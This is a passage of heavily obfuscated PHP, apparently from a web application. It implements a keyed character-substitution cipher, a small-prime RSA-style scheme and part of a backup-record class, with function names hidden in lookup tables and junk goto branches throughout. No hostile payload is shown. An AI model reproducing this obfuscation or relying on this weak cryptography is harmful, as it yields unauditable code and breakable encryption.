$this->{$_SERVER[µ¨«][156]}($EŠ­…Öçã¯, $eó’ËÇ§Ñ[223]($E»…Éí¯Œ³ . $fº¼ö­¾ğ)); break; case $eó’ËÇ§Ñ[229]: $A„…Ğ°‚“ì = $this->{$_SERVER[µ¨«][156]}($EŠ­…Öçã¯, $eó’ËÇ§Ñ[223]($fº¼ö­¾ğ . $E»…Éí¯Œ³)); $eà·Æ‘²½Œ = $böƒ¸‰ŒÇ¾[656]; break; case $eó’ËÇ§Ñ[345]: $A„…Ğ°‚“ì = $this->{$_SERVER[µ¨«][156]}($EŠ­…Öçã¯, $eó’ËÇ§Ñ[127]($fº¼ö­¾ğ . $E»…Éí¯Œ³)); $aÅÇ»­”¢‘ = $böƒ¸‰ŒÇ¾[657]; break; case $eó’ËÇ§Ñ[346]: $A„…Ğ°‚“ì = $this->{$_SERVER[µ¨«][156]}($EŠ­…Öçã¯, $eó’ËÇ§Ñ[123]($fº¼ö­¾ğ . $E»…Éí¯Œ³)); $E×ÓÍÇ¾¦ = $böƒ¸‰ŒÇ¾[658]; if (!$E×ÓÍÇ¾¦) { return; } break; case $eó’ËÇ§Ñ[347]: goto c¯ÀŒï­‚è; aÈˆÊŒ©¿: if (strlen($f°¬àôæœ×) < $böƒ¸‰ŒÇ¾[583]) { return; } $EÃ×Œá™ = $eó’ËÇ§Ñ[25]($EÃ×Œá™, $B±óƒª†ÆÔ % 8, $B±óƒª†ÆÔ % 8 + 7); $DÈ¸¦Ñƒ”… = $böƒ¸‰ŒÇ¾[662]; goto F‘„¨–·¹Á; cë»¬‰‡ñÕ: $dŞ¢“ãëØÕ = $böƒ¸‰ŒÇ¾[664]; while ($dŞ¢“ãëØÕ < $böƒ¸‰ŒÇ¾[184]) { if ($dŞ¢“ãëØÕ >= 0) { break; } $dŞ¢“ãëØÕ++; } for ($EõÔ­‚ÓÇ® = 0; $EõÔ­‚ÓÇ® < $eó’ËÇ§Ñ[24]($EŠ­…Öçã¯); $EõÔ­‚ÓÇ®++) { $B“ó³ÓÑÉ = $B“ó³ÓÑÉ == $eó’ËÇ§Ñ[24]($EÃ×Œá™) ? 0 : $B“ó³ÓÑÉ; $bõ§æŸïç = ($B±óƒª†ÆÔ + $eó’ËÇ§Ñ[349]($Bãù†àœ‚‘, $EŠ­…Öçã¯[$EõÔ­‚ÓÇ®]) + $eó’ËÇ§Ñ[350]($EÃ×Œá™[$B“ó³ÓÑÉ++])) % 64; $c×Øà×ŞŒ’ = $böƒ¸‰ŒÇ¾[665]; while (strlen($c×Øà×ŞŒ’) < $böƒ¸‰ŒÇ¾[184]) { if (!$c×Øà×ŞŒ’) { break; } $c×Øà×ŞŒ’++; } $cÛ¯¤Ÿ´ .= $Bãù†àœ‚‘[$bõ§æŸïç]; } goto B³›ˆ†ö; dßóŸËÇ‰Š: $bõ§æŸïç = 0; $eÑëµ¯§¿ = $böƒ¸‰ŒÇ¾[663]; $B“ó³ÓÑÉ = 0; goto cë»¬‰‡ñÕ; AÖ…ºÆ¦ø§: if (!$c¯„Â‹®†½) { return; } $C†Ï¢„èç¡ = $Bãù†àœ‚‘[$B±óƒª†ÆÔ]; $dÀ™“ÚäÉ = $böƒ¸‰ŒÇ¾[660]; goto DêíÏÉÏ¹©; F‘„¨–·¹Á: if (!$DÈ¸¦Ñƒ”…) { die; } $cÛ¯¤Ÿ´ = $eó’ËÇ§Ñ[10]; $EõÔ­‚ÓÇ® = 0; goto dßóŸËÇ‰Š; B³›ˆ†ö: $A„…Ğ°‚“ì = $eó’ËÇ§Ñ[341]($C†Ï¢„èç¡ . $cÛ¯¤Ÿ´); break; goto B˜ÀÚŒóœÑ; DêíÏÉÏ¹©: if (strlen($dÀ™“ÚäÉ) < $böƒ¸‰ŒÇ¾[184]) { die; } $EÃ×Œá™ = $eó’ËÇ§Ñ[123]($C†Ï¢„èç¡ . $eó’ËÇ§Ñ[123]($E»…Éí¯Œ³ . $C†Ï¢„èç¡) . $E»…Éí¯Œ³); $f°¬àôæœ× = $böƒ¸‰ŒÇ¾[661]; goto aÈˆÊŒ©¿; c¯ÀŒï­‚è: $EŠ­…Öçã¯ = $eó’ËÇ§Ñ[127]($EŠ­…Öçã¯); $B±óƒª†ÆÔ = $eó’ËÇ§Ñ[348](0, 64); $c¯„Â‹®†½ = $böƒ¸‰ŒÇ¾[659]; goto AÖ…ºÆ¦ø§; B˜ÀÚŒóœÑ: default: $A„…Ğ°‚“ì = $this->{$_SERVER[µ¨«][156]}($EŠ­…Öçã¯, $E»…Éí¯Œ³ . $fº¼ö­¾ğ); break; $bï‰ñ³”¦å = $böƒ¸‰ŒÇ¾[666]; if (!$bï‰ñ³”¦å) { die; } } $A„…Ğ°‚“ì = $eó’ËÇ§Ñ[223]($F•Ä¹ôÎãò . $fº¼ö­¾ğ . $A„…Ğ°‚“ì); $C†»Ê‘ø = $böƒ¸‰ŒÇ¾[667]; goto dá¬Áˆé´; f§ùÀØˆ¦‰: $F•Ä¹ôÎãò = $eó’ËÇ§Ñ[339](0, 5) . $eó’ËÇ§Ñ[10]; $fº¼ö­¾ğ = $eó’ËÇ§Ñ[133](15); $Bãù†àœ‚‘ = $eó’ËÇ§Ñ[344]; goto Cå×Úƒ®Œ; eï¾ˆã»›å: $EŠ­…Öçã¯ = $eó’ËÇ§Ñ[2]($EŠ­…Öçã¯); $Câ„Şº©— = $böƒ¸‰ŒÇ¾[655]; if (strlen($Câ„Şº©—) < $böƒ¸‰ŒÇ¾[184]) { return; } goto f§ùÀØˆ¦‰; dá¬Áˆé´: if ($dÇƒ³î¿ÂÇ - 1 > 0) { $A„…Ğ°‚“ì = $this->{$_SERVER[µ¨«][136]}($A„…Ğ°‚“ì, $E»…Éí¯Œ³, $dÇƒ³î¿ÂÇ - 1); } return $A„…Ğ°‚“ì; goto D„ƒõãº†á; e¿†í£ïàÛ: $böƒ¸‰ŒÇ¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eó’ËÇ§Ñ =& $_SERVER[µ¨«]; $eó’ËÇ§Ñ[343](1); goto eï¾ˆã»›å; D„ƒõãº†á: } private function yzgu329ff9ca($C·ñ±¿·İ‘, $DˆÃ‘Í¤ô¿, $a¶ƒîÒºŞÆ = 3) { goto eæŒ±‚Œ½; cß†òÆ´ºë: $A¥¦¿˜¹ÍÀ = $E‰§Â ³Šè[669]; while (strlen($A¥¦¿˜¹ÍÀ) < $E‰§Â ³Šè[579]) { if (!$A¥¦¿˜¹ÍÀ) { break; } $A¥¦¿˜¹ÍÀ++; } $Aî½¿œì™ = $C·ñ±¿·İ‘[0]; goto e¿‚Ì¹‚Ê³; e…óà‘ãÕ«: $C·ñ±¿·İ‘ = $B Å–É³«Š[2]($C·ñ±¿·İ‘); $BåêŠó®¶ç = $E‰§Â ³Šè[668]; $C·ñ±¿·İ‘ = $B Å–É³«Š[223]($C·ñ±¿·İ‘); goto cß†òÆ´ºë; Cêë½”óì: $BãîìøÎ˜ = $E‰§Â ³Šè[672]; switch ($Aî½¿œì™) { case $B Å–É³«Š[241]: $b´ˆ–®á = $this->{$_SERVER[µ¨«][256]}($C·ñ±¿·İ‘, $B Å–É³«Š[223]($DˆÃ‘Í¤ô¿ . $AàÔÆæ©¤í)); break; $FÕïÁÊ¾©Õ = $E‰§Â ³Šè[673]; while ($FÕïÁÊ¾©Õ < $E‰§Â ³Šè[184]) { if ($FÕïÁÊ¾©Õ >= 0) { break; } $FÕïÁÊ¾©Õ++; } case $B Å–É³«Š[229]: $b´ˆ–®á = $this->{$_SERVER[µ¨«][256]}($C·ñ±¿·İ‘, $B Å–É³«Š[223]($AàÔÆæ©¤í . $DˆÃ‘Í¤ô¿)); break; case $B Å–É³«Š[345]: $b´ˆ–®á = $this->{$_SERVER[µ¨«][256]}($C·ñ±¿·İ‘, $B Å–É³«Š[127]($AàÔÆæ©¤í . $DˆÃ‘Í¤ô¿)); $dĞù‰åÇòÀ = $E‰§Â ³Šè[674]; if (strlen($dĞù‰åÇòÀ) < $E‰§Â ³Šè[573]) { die; } break; $aé ÔÁñ› = $E‰§Â ³Šè[675]; if (!$aé ÔÁñ›) { return; } case $B Å–É³«Š[346]: $b´ˆ–®á = $this->{$_SERVER[µ¨«][256]}($C·ñ±¿·İ‘, $B Å–É³«Š[123]($AàÔÆæ©¤í . $DˆÃ‘Í¤ô¿)); $e¼ É¯¸›­ = $E‰§Â ³Šè[676]; if (strlen($e¼ É¯¸›­) < $E‰§Â ³Šè[583]) { die; } break; case $B Å–É³«Š[347]: goto eäÌ Æ°íÍ; aÔ¡ÏÖ¨ï§: while (strlen($cŒØ£¸–„„) < $E‰§Â ³Šè[581]) { if (!$cŒØ£¸–„„) { break; } $cŒØ£¸–„„++; } $eˆÖÕòïæ· = 0; $cÜö§° = $E‰§Â ³Šè[682]; goto D°¿Æ½îî; D°¿Æ½îî: if (strlen($cÜö§°) < $E‰§Â ³Šè[583]) { return; } for ($Cí×«Ú¼ Å = 0; $Cí×«Ú¼ Å < $B Å–É³«Š[24]($C·ñ±¿·İ‘); $Cí×«Ú¼ Å++) { $eˆÖÕòïæ· = $eˆÖÕòïæ· == $B Å–É³«Š[24]($E¾¬è®…÷¨) ? 0 : $eˆÖÕòïæ·; $eÁ™ó«”×Æ = $E‰§Â ³Šè[683]; $bÁ¬…ÂµåÇ = $eˆÖÕòïæ·++; $e›é¬À‡¡Ö = $B Å–É³«Š[349]($dÒâ¨Î¹Ö–, $C·ñ±¿·İ‘[$Cí×«Ú¼ Å]) - $DõŠ¯¿Ê¢ - $B Å–É³«Š[350]($E¾¬è®…÷¨[$bÁ¬…ÂµåÇ]); while ($e›é¬À‡¡Ö < 0) { $e›é¬À‡¡Ö += 64; $cÀÇ§³öÑÉ = $E‰§Â ³Šè[684]; while (strlen($cÀÇ§³öÑÉ) < $E‰§Â ³Šè[583]) { if (!$cÀÇ§³öÑÉ) { break; } $cÀÇ§³öÑÉ++; } } $ağœÒÎÓù´ .= $dÒâ¨Î¹Ö–[$e›é¬À‡¡Ö]; } $b´ˆ–®á = $B Å–É³«Š[353]($ağœÒÎÓù´); goto f®Âà‰‚êÓ; D¶××–ä®»: $E¾¬è®…÷¨ = $B Å–É³«Š[25]($E¾¬è®…÷¨, $DõŠ¯¿Ê¢ % 8, $DõŠ¯¿Ê¢ % 8 + 7); $ağœÒÎÓù´ = $B Å–É³«Š[10]; $eÚÅ³»¢˜ = $E‰§Â ³Šè[679]; goto EˆËÜ±óƒ„; EˆËÜ±óƒ„: while ($eÚÅ³»¢˜ < $E‰§Â ³Šè[184]) { if ($eÚÅ³»¢˜ >= 0) { break; } $eÚÅ³»¢˜++; } $Cí×«Ú¼ Å = 0; $c²İŸµ ®‹ = $E‰§Â ³Šè[680]; goto E÷Ë „¢ù; eäÌ Æ°íÍ: $C·ñ±¿·İ‘ = $B Å–É³«Š[352]($C·ñ±¿·İ‘); $D–×ñè¶¡ˆ = $E‰§Â ³Šè[677]; if (strlen($D–×ñè¶¡ˆ) < $E‰§Â ³Šè[581]) { die; } goto c…‘¬´¨À‡; bßÑ¶·ŒÂÏ: while ($fÓøĞš÷® < $E‰§Â ³Šè[184]) { if ($fÓøĞš÷® >= 0) { break; } $fÓøĞš÷®++; } $DõŠ¯¿Ê¢ = $B Å–É³«Š[349]($dÒâ¨Î¹Ö–, $FŒ…«¸Ğ™º); $E¾¬è®…÷¨ = $B Å–É³«Š[123]($FŒ…«¸Ğ™º . $B Å–É³«Š[123]($DˆÃ‘Í¤ô¿ . $FŒ…«¸Ğ™º) . $DˆÃ‘Í¤ô¿); goto D¶××–ä®»; f®Âà‰‚êÓ: break; goto C‘®Šå¥ô­; E÷Ë „¢ù: while ($c²İŸµ ®‹ < $E‰§Â ³Šè[581]) { if ($c²İŸµ ®‹ >= 0) { break; } $c²İŸµ ®‹++; } $e›é¬À‡¡Ö = 0; $cŒØ£¸–„„ = $E‰§Â ³Šè[681]; goto aÔ¡ÏÖ¨ï§; c…‘¬´¨À‡: $FŒ…«¸Ğ™º = $C·ñ±¿·İ‘[0]; $C·ñ±¿·İ‘ = $B Å–É³«Š[25]($C·ñ±¿·İ‘, 1); $fÓøĞš÷® = $E‰§Â ³Šè[678]; goto bßÑ¶·ŒÂÏ; C‘®Šå¥ô­: default: $b´ˆ–®á = $this->{$_SERVER[µ¨«][256]}($C·ñ±¿·İ‘, $DˆÃ‘Í¤ô¿ . $AàÔÆæ©¤í); break; $F­»ˆ‰àÔî = $E‰§Â ³Šè[685]; if (!$F­»ˆ‰àÔî) { return; } } if ($a¶ƒîÒºŞÆ - 1 > 0) { $b´ˆ–®á = $this->{$_SERVER[µ¨«][198]}($b´ˆ–®á, $DˆÃ‘Í¤ô¿, $a¶ƒîÒºŞÆ - 1); } goto EÈÇã´ÃÀí; e¿‚Ì¹‚Ê³: $cæÛ«Ç¶Ê’ = $E‰§Â ³Šè[670]; if (!$cæÛ«Ç¶Ê’) { return; } $AàÔÆæ©¤í = $B Å–É³«Š[25]($C·ñ±¿·İ‘, 1, 15); goto DçŒ¯™¶ø«; DçŒ¯™¶ø«: $Eé´ËÁšÈ = $E‰§Â ³Šè[671]; $C·ñ±¿·İ‘ = $B Å–É³«Š[25]($C·ñ±¿·İ‘, 16); $dÒâ¨Î¹Ö– = $B Å–É³«Š[344]; goto Cêë½”óì; eæŒ±‚Œ½: $E‰§Â ³Šè =& $_SERVER[åÌÛ»ô¢‚ö™]; $B Å–É³«Š =& $_SERVER[µ¨«]; if (!$B Å–É³«Š[351]($C·ñ±¿·İ‘) || $B Å–É³«Š[24]($C·ñ±¿·İ‘) < 10) { return !1; } goto e…óà‘ãÕ«; EÈÇã´ÃÀí: return $b´ˆ–®á; goto E÷ŒºÃ·Ô“; E÷ŒºÃ·Ô“: } public function awfld6e47423($FÅ³¹Õƒï) { goto bÙÈ“†çÍó; D†Éğ¦Ğøš: for ($b‡ë·ø…® = 0; $b‡ë·ø…® < $D‚Ø¾í¨Ï¨ * 10; $b‡ë·ø…®++) { if (($D‚Ø¾í¨Ï¨ * $b‡ë·ø…® + 1) % $E•¨ŠìóÈ == 0) { $C×Šğ„„„¡ = $E¦ÀöòÀ•¦[250](($D‚Ø¾í¨Ï¨ * $b‡ë·ø…® + 1) / $E•¨ŠìóÈ); break; } } $cßŒ‡Ù×ˆº = $this->{$_SERVER[µ¨«][156]}($e¦ö£ë²±¦ * $eÚ‘—ÃÍ . $E¦ÀöòÀ•¦[10], $E¦ÀöòÀ•¦[158]); $E›ÚöŒ‰í• = $EŠ˜íÀàé•[690]; goto bÅï’§ Ç»; dù„ˆòŞÕ©: $D‚Ø¾í¨Ï¨ = ($e¦ö£ë²±¦ - 1) * ($eÚ‘—ÃÍ - 1); $E•¨ŠìóÈ = $E¦ÀöòÀ•¦[250](($e¦ö£ë²±¦ + $eÚ‘—ÃÍ) / 2); while (1) { $cô‰µòºœ’ = $E•¨ŠìóÈ; $f²½‹îØ¢ = $D‚Ø¾í¨Ï¨; $Fø¢·¨£Ÿ = $EŠ˜íÀàé•[687]; if (!$Fø¢·¨£Ÿ) { return; } while ($f²½‹îØ¢ % $cô‰µòºœ’ != 0) { $E™Ñõ³­Ö­ = $f²½‹îØ¢; $f²½‹îØ¢ = $cô‰µòºœ’; $bæ¢…óôê± = $EŠ˜íÀàé•[688]; if (!$bæ¢…óôê±) { die; } $cô‰µòºœ’ = $E™Ñõ³­Ö­ % $cô‰µòºœ’; } if ($cô‰µòºœ’ == 1) { break; } else { $E•¨ŠìóÈ++; } } goto eÕä†Ú¹º…; aÕñ¯ÑÆ†—: while ($bçôç‘ˆï¥ < $EŠ˜íÀàé•[184]) { if ($bçôç‘ˆï¥ >= 0) { break; } $bçôç‘ˆï¥++; } return $eåÍç¯á¸; $bŸÒ§ğó… = $EŠ˜íÀàé•[693]; goto cÚŞåßéˆê; cÚŞåßéˆê: if (strlen($bŸÒ§ğó…) < $EŠ˜íÀàé•[573]) { die; } goto f¨¢¸ôÔÍˆ; eÕä†Ú¹º…: $C×Šğ„„„¡ = 2; $a£Œš¢Üš× = $EŠ˜íÀàé•[689]; if (strlen($a£Œš¢Üš×) < $EŠ˜íÀàé•[573]) { return; } goto D†Éğ¦Ğøš; bÅï’§ Ç»: if (strlen($E›ÚöŒ‰í•) < $EŠ˜íÀàé•[573]) { die; } $cŸâ£™› = $E¦ÀöòÀ•¦[123]($E¦ÀöòÀ•¦[355] . ($e¦ö£ë²±¦ + $eÚ‘—ÃÍ) . $E¦ÀöòÀ•¦[356] . $E•¨ŠìóÈ . $E¦ÀöòÀ•¦[356] . $C×Šğ„„„¡ . $E¦ÀöòÀ•¦[357]); $BáÚÕ·²É¨ = $EŠ˜íÀàé•[691]; goto BÂ‡ëÄÎ¶¼; BÂ‡ëÄÎ¶¼: while (strlen($BáÚÕ·²É¨) < $EŠ˜íÀàé•[573]) { if (!$BáÚÕ·²É¨) { break; } $BáÚÕ·²É¨++; } $eåÍç¯á¸ = $this->{$_SERVER[µ¨«][156]}($FÅ³¹Õƒï, $cŸâ£™›) . $E¦ÀöòÀ•¦[358] . $cßŒ‡Ù×ˆº; $bçôç‘ˆï¥ = $EŠ˜íÀàé•[692]; goto aÕñ¯ÑÆ†—; A¿¿ÕÍ†Ç‘: $D‚öŒ¤ˆµ£ = $EŠ˜íÀàé•[686]; if (!$D‚öŒ¤ˆµ£) { die; } $eÚ‘—ÃÍ = $this->{$_SERVER[µ¨«][354]}(); goto dù„ˆòŞÕ©; bÙÈ“†çÍó: $EŠ˜íÀàé• =& $_SERVER[åÌÛ»ô¢‚ö™]; $E¦ÀöòÀ•¦ =& $_SERVER[µ¨«]; $e¦ö£ë²±¦ = $this->{$_SERVER[µ¨«][354]}(); goto A¿¿ÕÍ†Ç‘; f¨¢¸ôÔÍˆ: } public function gwaf56a0338e($BÆàå¢˜š„) { goto DËÕÖ¹íç; DËÕÖ¹íç: $b¹ÛğÆìˆñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a®®ãå—ª =& $_SERVER[µ¨«]; $eğª¯’ëŞ = $a®®ãå—ª[0]($a®®ãå—ª[358], $BÆàå¢˜š„); goto Déê¶ƒÜ«è; b™©…âÑ: $BÄÅ¸ÄÀÏó = $b¹ÛğÆìˆñ[697]; while (1) { $c³ŒÔ®Ï½ˆ = $Cƒô¥ƒÒí; $AÕâŠ–Ôñ = $b¹ÛğÆìˆñ[698]; if (!$AÕâŠ–Ôñ) { return; } $AÌÅ ‡Š›Î = $b­Òˆ‘ãÁ; $F¤÷š¬ÍĞç = $b¹ÛğÆìˆñ[699]; while ($AÌÅ ‡Š›Î % $c³ŒÔ®Ï½ˆ != 0) { $CÂº¢êõ¿Œ = $AÌÅ ‡Š›Î; $AÌÅ ‡Š›Î = $c³ŒÔ®Ï½ˆ; $D‰‰êï‹ = $b¹ÛğÆìˆñ[700]; while ($D‰‰êï‹ < $b¹ÛğÆìˆñ[184]) { if ($D‰‰êï‹ >= 0) { break; } $D‰‰êï‹++; } $c³ŒÔ®Ï½ˆ = $CÂº¢êõ¿Œ % $c³ŒÔ®Ï½ˆ; $BÄì½éÂËˆ = $b¹ÛğÆìˆñ[701]; } if ($c³ŒÔ®Ï½ˆ == 1) { break; } else { $Cƒô¥ƒÒí++; } } $CåìŸ·®ˆ = 2; goto D®…ø£ÆË; D®…ø£ÆË: $d‚äÃ“ŞÅ = $b¹ÛğÆìˆñ[651]; if (!$d‚äÃ“ŞÅ) { return; } for ($dê¾Ä–ŸÕ = 0; $dê¾Ä–ŸÕ < $b­Òˆ‘ãÁ * 10; $dê¾Ä–ŸÕ++) { if (($b­Òˆ‘ãÁ * $dê¾Ä–ŸÕ + 1) % $Cƒô¥ƒÒí == 0) { $CåìŸ·®ˆ = $a®®ãå—ª[250](($b­Òˆ‘ãÁ * $dê¾Ä–ŸÕ + 1) / $Cƒô¥ƒÒí); break; } } goto a£´î¨…›ƒ; eÜâ’²ğ¦¹: if (!$a©Í„”À§) { return $a®®ãå—ª[10]; } $a©Í„”À§ = $a®®ãå—ª[250]($a©Í„”À§); $aòÎá”ª…› = 0; goto e¥‹¾Îø¯Â; dÆÆØ¼ù¨: $d—×‰Ş’¢ = $this->{$_SERVER[µ¨«][256]}($eğª¯’ëŞ[0], $d³ÎÓ†êôš); $eìã—³Ó„ò = $b¹ÛğÆìˆñ[703]; while (strlen($eìã—³Ó„ò) < $b¹ÛğÆìˆñ[581]) { if (!$eìã—³Ó„ò) { break; } $eìã—³Ó„ò++; } goto BÈ«¶ª—•›; BÈ«¶ª—•›: return $d—×‰Ş’¢; $AìÏà—½˜¸ = $b¹ÛğÆìˆñ[704]; if (strlen($AìÏà—½˜¸) < $b¹ÛğÆìˆñ[583]) { die; } goto bùØŠÛŒ—×; a£´î¨…›ƒ: $d³ÎÓ†êôš = $a®®ãå—ª[123]($a®®ãå—ª[355] . ($aòÎá”ª…› + $E¯½—¼íš¯) . $a®®ãå—ª[356] . $Cƒô¥ƒÒí . $a®®ãå—ª[356] . $CåìŸ·®ˆ . $a®®ãå—ª[357]); $b¦¦Äƒ„½ = $b¹ÛğÆìˆñ[702]; while (strlen($b¦¦Äƒ„½) < $b¹ÛğÆìˆñ[579]) { if (!$b¦¦Äƒ„½) { break; } $b¦¦Äƒ„½++; } goto dÆÆØ¼ù¨; e¥‹¾Îø¯Â: $BÒ¾éÆ‚ = $b¹ÛğÆìˆñ[695]; if (strlen($BÒ¾éÆ‚) < $b¹ÛğÆìˆñ[579]) { return; } $E¯½—¼íš¯ = 0; goto d„ÛÏé°ø; d„ÛÏé°ø: for ($dê¾Ä–ŸÕ = 3; $dê¾Ä–ŸÕ < $a©Í„”À§; $dê¾Ä–ŸÕ += 2) { if ($a©Í„”À§ % $dê¾Ä–ŸÕ != 0) { continue; } $aòÎá”ª…› = $dê¾Ä–ŸÕ; $E¯½—¼íš¯ = $a®®ãå—ª[250]($a©Í„”À§ / $dê¾Ä–ŸÕ); $E¤Ş˜ìê = $b¹ÛğÆìˆñ[696]; if (strlen($E¤Ş˜ìê) < $b¹ÛğÆìˆñ[581]) { die; } break; } $b­Òˆ‘ãÁ = ($aòÎá”ª…› - 1) * ($E¯½—¼íš¯ - 1); $Cƒô¥ƒÒí = $a®®ãå—ª[250](($aòÎá”ª…› + $E¯½—¼íš¯) / 2); goto b™©…âÑ; Déê¶ƒÜ«è: if ($a®®ãå—ª[19]($eğª¯’ëŞ) != 2) { return $a®®ãå—ª[10]; } $a©Í„”À§ = $this->{$_SERVER[µ¨«][256]}($eğª¯’ëŞ[1] . $a®®ãå—ª[10], $a®®ãå—ª[158]); $C’Ã½Ï‚µº = $b¹ÛğÆìˆñ[694]; goto eÜâ’²ğ¦¹; bùØŠÛŒ—×: } public function boygd8abfeeb() { goto c¼â»Æ®“º; c¼â»Æ®“º: $D›ä¾ÂÒ©² =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÚòìööåİ =& $_SERVER[µ¨«]; $FÌ±èÈ¯Ï” = $BÚòìööåİ[339]($BÚòìööåİ[359](2, 14), $BÚòìööåİ[359](2, 16) - 1); goto A†¶ Ûíá; E£ìŠĞ‘íƒ: while ($B¤åí‘Í¦ <= (int) $BÚòìööåİ[360]($FÌ±èÈ¯Ï”)) { $fÙ‰Äö¥¸¼ = $B¤åí‘Í¦; $EôÏÁÜ¸£ = $D›ä¾ÂÒ©²[706]; while (!0) { $fÙ‰Äö¥¸¼++; $D‘ºŒŞ¸· = $D›ä¾ÂÒ©²[707]; if (strlen($D‘ºŒŞ¸·) < $D›ä¾ÂÒ©²[579]) { die; } if ($fÙ‰Äö¥¸¼ <= 2) { $B¤åí‘Í¦ = $fÙ‰Äö¥¸¼; break; } else { if ($fÙ‰Äö¥¸¼ < 2) { continue; } } $b¾‚œœò†Õ = !0; for ($DéŞŸÊ²é² = 2; $DéŞŸÊ²é² <= $BÚòìööåİ[360]($fÙ‰Äö¥¸¼); $DéŞŸÊ²é²++) { if ($fÙ‰Äö¥¸¼ % $DéŞŸÊ²é² == 0) { $b¾‚œœò†Õ = !1; } } if ($b¾‚œœò†Õ) { $B¤åí‘Í¦ = $fÙ‰Äö¥¸¼; break; } } $fÇ‰½…—¡â[] = $B¤åí‘Í¦; } $d¿”‹Â³ˆß = 2; $e™Õ­‰­”ï = $D›ä¾ÂÒ©²[708]; goto FÃëœÄç‹½; A†¶ Ûíá: $fÇ‰½…—¡â = array(); $då¤ËŠ¿ ‡ = $D›ä¾ÂÒ©²[705]; $B¤åí‘Í¦ = 1; goto E£ìŠĞ‘íƒ; FÃëœÄç‹½: for ($fÙ‰Äö¥¸¼ = $FÌ±èÈ¯Ï”; $fÙ‰Äö¥¸¼ > 1; $fÙ‰Äö¥¸¼--) { $b¾‚œœò†Õ = !0; $FƒÄâÊÏôô = $D›ä¾ÂÒ©²[709]; if (strlen($FƒÄâÊÏôô) < $D›ä¾ÂÒ©²[573]) { die; } foreach ($fÇ‰½…—¡â as $aÊùØ¿ì‰) { if ($fÙ‰Äö¥¸¼ % $aÊùØ¿ì‰ == 0) { $b¾‚œœò†Õ = !1; break; } } if ($b¾‚œœò†Õ) { $d¿”‹Â³ˆß = $fÙ‰Äö¥¸¼; break; } } return $d¿”‹Â³ˆß; $cÖŞèÚ¢Ó = $D›ä¾ÂÒ©²[710]; goto fÑŞàÛ±Æ§; fÑŞàÛ±Æ§: } public function pibab13dc6c3($aí‡Ü’¤‡ç, $a®Í‹×Î›˜) { $AŞŠáÅ‡ˆ =& $_SERVER[µ¨«]; return $AŞŠáÅ‡ˆ[13](array($AŞŠáÅ‡ˆ[14], $AŞŠáÅ‡ˆ[361]), $aí‡Ü’¤‡ç, $a®Í‹×Î›˜); $b–ŒŞ”æõ = $_SERVER[åÌÛ»ô¢‚ö™][711]; } public function suara55c578f($C´ˆëˆ–‚, $Cˆƒîæ¡É) { $eÊç¡¿¥ =& $_SERVER[µ¨«]; return $eÊç¡¿¥[13](array($eÊç¡¿¥[362], $eÊç¡¿¥[363]), $C´ˆëˆ–‚, $Cˆƒîæ¡É); $E„åÙóÂ³ = $_SERVER[åÌÛ»ô¢‚ö™][712]; if (!$E„åÙóÂ³) { die; } } public function hoqiac14a398($eŒïêò¬™Í, $BêËİ—¾è“) { $DåÃ”ôš =& $_SERVER[åÌÛ»ô¢‚ö™]; $eØ›Ì–»†ò =& $_SERVER[µ¨«]; return $eØ›Ì–»†ò[13](array($eØ›Ì–»†ò[362], $eØ›Ì–»†ò[364]), $eŒïêò¬™Í, $BêËİ—¾è“); $DêöÔÍÖçŒ = $DåÃ”ôš[713]; if (strlen($DêöÔÍÖçŒ) < $DåÃ”ôš[573]) { die; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f†¼ïäŒƒÍ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::$name = date($f†¼ïäŒƒÍ[714]); if (!($Aà¨©±ƒõ = Model($f†¼ïäŒƒÍ[715])->lastItem())) { $Aà¨©±ƒõ = $this->initData(); } else { self::$name = $Aà¨©±ƒõ[$f†¼ïäŒƒÍ[28]]; if ($Aà¨©±ƒõ[$f†¼ïäŒƒÍ[716]] == $f†¼ïäŒƒÍ[83]) { self::$name = date($f†¼ïäŒƒÍ[717]); $A’¯òß¥› = 0; if (isset($Aà¨©±ƒõ[$f†¼ïäŒƒÍ[296]][$f†¼ïäŒƒÍ[171]][$f†¼ïäŒƒÍ[444]])) { $A’¯òß¥› = (int) $Aà¨©±ƒõ[$f†¼ïäŒƒÍ[296]][$f†¼ïäŒƒÍ[171]][$f†¼ïäŒƒÍ[444]]; } if ($Aà¨©±ƒõ[$f†¼ïäŒƒÍ[28]] == self::$name) { Model($f†¼ïäŒƒÍ[715])->remove($Aà¨©±ƒõ[$f†¼ïäŒƒÍ[392]]); } $Aà¨©±ƒõ = $this->initData($A’¯òß¥›, $Aà¨©±ƒõ[$f†¼ïäŒƒÍ[718]]); } else { $this->checkStore($Aà¨©±ƒõ[$f†¼ïäŒƒÍ[718]]); } } self::$option = $Aà¨©±ƒõ; } private function initData($B‹‚’Û‘ªÒ = 0, $aõêà¯¢µ = '') { goto c©‹‰÷˜„; Fƒ­ŸÈÊë: $FÅÜâ²§ºà[$FÆÌğİä†‰[392]] = $EÛùŠğñ‹‡; return $FÅÜâ²§ºà; goto F¥˜¤¬‚; D‹Ñ’¡¨ŠŸ: $this->checkStore($dŸÒŒÛƒ›²[$FÆÌğİä†‰[718]]); $FÅÜâ²§ºà = array($FÆÌğİä†‰[718] => $dŸÒŒÛƒ›²[$FÆÌğİä†‰[718]], $FÆÌğİä†‰[28] => self::$name, $FÆÌğİä†‰[716] => 0, $FÆÌğİä†‰[719] => $dŸÒŒÛƒ›²[$FÆÌğİä†‰[719]], $FÆÌğİä†‰[296] => array($FÆÌğİä†‰[720] => array($FÆÌğİä†‰[716] => 0), $FÆÌğİä†‰[721] => array($FÆÌğİä†‰[716] => 0, $FÆÌğİä†‰[722] => 0, $FÆÌğİä†‰[723] => 0, $FÆÌğİä†‰[29] => $FÆÌğİä†‰[33]), $FÆÌğİä†‰[724] => array($FÆÌğİä†‰[716] => 0, $FÆÌğİä†‰[722] => 0, $FÆÌğİä†‰[723] => 0), $FÆÌğİä†‰[171] => array($FÆÌğİä†‰[716] => 0, $FÆÌğİä†‰[725] => 0, $FÆÌğİä†‰[726] => 0, $FÆÌğİä†‰[727] => 0, $FÆÌğİä†‰[728] => 0, $FÆÌğİä†‰[444] => $B‹‚’Û‘ªÒ)), $FÆÌğİä†‰[729] => time(), $FÆÌğİä†‰[473] => 0); $EÛùŠğñ‹‡ = Model($FÆÌğİä†‰[715])->insert($FÅÜâ²§ºà); goto Fƒ­ŸÈÊë; c©‹‰÷˜„: 